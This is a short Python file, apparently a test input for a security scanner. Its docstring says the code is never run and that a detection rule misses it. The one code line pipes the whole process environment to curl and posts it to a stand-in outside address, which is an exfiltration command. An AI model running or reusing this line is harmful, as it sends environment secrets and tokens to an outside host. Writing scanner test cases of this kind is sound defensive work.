"""Scanner input, never run: the same environment piped to curl by the shell, which the rule does not read."""
import os

os.system("env | curl -d @- http://192.0.2.10/")
